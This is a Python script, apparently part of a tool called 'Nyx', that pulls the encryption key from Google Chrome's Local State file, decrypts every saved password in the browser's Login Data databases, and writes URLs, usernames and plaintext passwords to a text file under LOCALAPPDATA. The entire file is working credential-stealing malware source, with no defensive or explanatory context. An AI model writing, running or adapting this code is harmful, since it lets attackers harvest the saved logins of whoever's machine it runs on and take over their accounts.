import os
import shutil
import sqlite3
import base64
import json  
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

class PasswordExtractor:
    def __init__(self, browser_path):
        self.BrowserPath = browser_path

    def GetEncryptionKey(self) -> bytes:
        try:
            local_state_path = os.path.join(self.BrowserPath, "Local State")
            
            with open(local_state_path, 'r', encoding='utf-8') as file:
                local_state_data = json.load(file)
            
            encrypted_key = local_state_data["os_crypt"]["encrypted_key"]
            
            encrypted_key = base64.b64decode(encrypted_key)[5:]  
            
            decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            
            return decrypted_key
        except Exception as e:
            print(f"Erro ao obter a chave de criptografia: {e}")
            return None

    def Decrypt(self, encrypted_password: bytes, key: bytes) -> str:
        try:
            iv = encrypted_password[3:15]
            encrypted_password = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(encrypted_password)[:-16].decode()
            return decrypted_password
        except Exception as e:
            print(f"Erro ao descriptografar: {e}")
            return ""

    def GetPasswords(self) -> list[tuple[str, str, str]]:
        encryptionKey = self.GetEncryptionKey()
        passwords = list()

        if encryptionKey is None:
            print("Chave de criptografia não encontrada.")
            return passwords

        loginFilePaths = list()

        for root, _, files in os.walk(self.BrowserPath):
            for file in files:
                if file.lower() == "login data":
                    filepath = os.path.join(root, file)
                    loginFilePaths.append(filepath)

        for path in loginFilePaths:
            while True:
                tempfile = os.path.join(
                    os.getenv("TEMP"), self.GetRandomString(10) + ".tmp"
                )
                if not os.path.isfile(tempfile):
                    break

            try:
                shutil.copy(path, tempfile)
            except Exception as e:
                print(f"Erro ao copiar arquivo de login: {e}")
                continue

            db = sqlite3.connect(tempfile)
            db.text_factory = lambda b: b.decode(errors="ignore")
            cursor = db.cursor()

            try:
                results = cursor.execute(
                    "SELECT origin_url, username_value, password_value FROM logins"
                ).fetchall()

                for url, username, encrypted_password in results:
                    password = self.Decrypt(encrypted_password, encryptionKey)

                    if url and username and password:
                        passwords.append((url, username, password))

            except Exception as e:
                print(f"Erro ao consultar banco de dados: {e}")

            cursor.close()
            db.close()
            os.remove(tempfile)

        return passwords

    def GetRandomString(self, length: int) -> str:
        return base64.urlsafe_b64encode(os.urandom(length)).decode()[:length]

    def SavePasswordsToFile(self, passwords: list[tuple[str, str, str]], file_path: str) -> None:
        try:
            with open(file_path, 'w', encoding='utf-8') as file:
                for url, username, password in passwords:
                    file.write(f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n")
            print(f"Senhas salvas em: {file_path}")
        except Exception as e:
            print(f"Erro ao salvar senhas em arquivo: {e}")

if __name__ == "__main__":
    browser_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data"
    extractor = PasswordExtractor(browser_path)

    passwords = extractor.GetPasswords()
    
    if passwords:
        nyx_path = os.path.join(os.getenv("LOCALAPPDATA"), "Nyx")
        if not os.path.exists(nyx_path):
            os.makedirs(nyx_path)
        
        passwords_file_path = os.path.join(nyx_path, "passwords.txt")
        extractor.SavePasswordsToFile(passwords, passwords_file_path)
    else:
        print("Nenhuma senha encontrada.")
